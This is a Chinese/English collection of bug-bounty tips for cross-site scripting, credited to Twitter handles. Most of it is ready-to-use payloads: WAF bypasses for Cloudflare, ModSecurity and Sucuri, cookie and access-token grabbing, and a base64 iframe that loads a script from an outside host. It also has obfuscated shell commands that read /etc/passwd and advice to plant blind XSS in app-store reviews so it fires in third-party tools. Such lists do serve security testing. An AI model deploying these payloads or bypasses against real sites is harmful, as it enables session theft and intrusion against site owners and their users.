
### Cross Site Scripting (XSS):

1.在没有参数的jsp页面情况下,可以尝试使用分号添加路径参数，比如这样：

```bash
http://example.com/test.jsp;');alert(1)// & perform XSS
```

Apache tomcat支持此功能.@0xMstar


2.@r1cs3c:当一切都无法正常工作时，我使用的一种有效的XSS绕过技术是关闭结束标记：

```js
hhh<img src="#" onmouseenter="prompt('XSS')" gggg
```

3.测试购物网站时，订购商品（而不只是IDOR）后，请尝试使用订购ID参数中的XSS Payload。他们忘了在那里过滤，因为它们本来就是数字;) @imhaxormad

4.在查看.js文件时，请尝试确定代码中的薄弱环节。例如，innerHTML表示可能存在XSS。 @rvismit

5.tip for blind xss:将bxss payloads注入appstore/play商店的应用程序评论中，公司经常使用第三方应用程序评论分析应用程序。Payload可以在第三方应用程序上触发，从而使您可以访问一些敏感信息。 @armaancrockroax

6.Use this payload for xss through open redirect ：

```js
/x:1/:///%01javascript:alert(document.cookie)/
```


7.您可以将输入框变成自动XSS，通过在“onfocus”属性上设置不可知的Payload，然后将其设置为“autofocus”，例如：

```js
<input onfocus="alert(0);" autofocus>
```


8.采用以下Payload作为文件扩展名。当扩展名反映在html中时。有时开发人员会验证文件名，而忘记验证扩展名，@ravirajpowar：

```js
<svg onload=alert(1)>
```


9.XSS Payload @LooseSecurity：

```js
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

10.将您的XSS Payload分成两个，例如ex。姓名，有时，您最终将获得Stored XSS，@evanricafort：

```js
<img src=x & LName: onerror=prompt(0);>
```

11.提示：演示XSS的影响，请不要使用alert('alert')。确定会话是存储在cookie还是本地存储中，然后将其放入弹出窗口中,@jmelika：

```js
cookie: alert(document.cookie)
LocalStorage: alert(localStorage.getItem('access_token'))
```

12.XSS Payload：

```js
Target[.]com/index.php?xss=<a href=x onfocus=alert(23) name=jj>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg onload="alert(1)" <="" svg=""
GUYS bypassed cloud flare using this payload
"><x/Onpointerrawupdate=confirm(document.cookie)>kira_deathnote
‟><marquee/onstart=confirm(1)>
"onfocus="alert`1`"autofocus="
Useful #XSS Payloads -
 "><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 XSS
<body ontouchstart=alert(1)>
Triggers when a finger touch the screen
<body ontouchend=alert(1)>
Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>
When a finger is dragged across the screen.
```

13.如果您遇到未验证的重定向问题，请不要只提交它，尝试触发反射性XSS，它会使报告更加有趣。我最喜欢的Payload是,@isrikanthd：

```js
javascript://%0aalert(1) 
javascript://%250aalert(1) in case of double encoding.
```

14.如果遇到注释页面，只需要在注释中打断一下就可以引起XSS，如果你们遇到此问题，请尝试以下操作,@rootpentesting：

```js
--!><Svg/Onload=confirm(document.domain)>
```

15.尝试使用".xss.ht"在Google上进行搜索，可以找到其他人正在测试的地方，甚至可以透露一些私有程序，@zseano。

16.您是否遇到过一个问题，可以弹出XSS，但括号内()被过滤？这个是有效Payload，可以绕过该问题，@rootpentesting：

```js
"onfocus="alert`1`"autofocus="
```

17.You can bypass a lot of #XSS filters using HTML comments.：

```js
<!----><script>alert(0);</script>
```

18.我们都知道'-alert-'和'; alert();'但是我通过fuzzing最新的Firefox找到了一些替代方案,@s0md3v：

```js
'^alert()^'
'*alert()*'
'/alert()/'
```

测试地址：[点此访问](https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=x)

19.@sasi2103:假设服务器过滤了),并且您想绕过它，然后使用：

```js
"-alert`1`,"
E.g window.location.replace("http://site.com/?x=3"); 
window.location.replace("http://site.com/?x=3"-alert`1`,") 
```

20.If the program replace all user input in the tag (ex: ,,etc.) into blank you can add "Line Feed (%0a)" before closing tag for bypass (ex: ,)：

```php
<?php
   echo "You say " . preg_replace("/<(.*?)>/", "", Array['x']);
?>
```

21.@M404ntf:XSS Bypass detection, point shot：

```js
">'><details/open/ontoggle=confirm('XSS')> ⌝
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ ⌝
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt; ⌝
```

22.@M404ntf:ModSecurity XSS Bypass：

```js
{ 1 }; <img src=x:alert(alt) onerror=eval(src) alt='spyerror'>
{ 2 }; "></tag><svg onload=alert(spyerror)>
```

23.@M404ntf:"Cloudflare" Bypass Payload：

```js
~1: &lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
~2: &lt;img longdesc="src=" images="" stop.png"="" onerror="alert(document.domain);//&quot;" src="x" alt="showme"&gt;
```

24.@M404ntf:Sucuri { RCE }; payloads：

```js
Smuggling RCE Payloads:
</> /???/??t+/???/??ss?? </>

Obfuscating RCE Payloads:
</> ;+cat+/e'tc/pass'wd </>
</> c\\a\\t+/et\\c/pas\\swd </>
```

25.[@cances](http://forum.ywhack.com/redirect.php?goto=findpost&ptid=114851&pid=115181):on事件被过滤：

```js
<iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cHM6Ly94c3MuaGFvemkubWUvai5qcz4="></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

第一个base64，第二个url编码，类似的object标签也可以

执行js代码时关键字被拦截：

```js
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"\>
<script>top["al"+"ert"](`xss`);</script>
<img src=x onerror="window['al'+'ert'](0)"></img>
```

26.一些其他关于 XSS 技巧分享：

 ·更多的一些BugBountyTips可以参考这里：[https://github.com/r0eXpeR/BountyTips](https://github.com/r0eXpeR/BountyTips)
 
 ·[https://github.com/pgaijin66/XSS-Payloads](https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt)

 ·[https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

 ·[一个Chrome插件.使用DevTools查找DOM XSS](https://github.com/filedescriptor/untrusted-types)

 ·[Twitter@XssPayloads](https://twitter.com/XssPayloads)

 ·[可以在不同上下文中使用的微小XSS Payload的集合](https://github.com/terjanq/Tiny-XSS-Payloads)

 ·[XSS数据接收平台（无SQL版）](https://github.com/trysec/BlueLotus_XSSReceiver)

 ·[用于检测和跟踪Blind XSS，XXE和SSRF的工具包](https://github.com/SpiderMate/B-XSSRF)

 ·[Cross Site Scripting (XSS) Bugbounty-Tips](https://gowsundar.gitbook.io/book-of-bugbounty-tips/cross-site-scripting-xss)


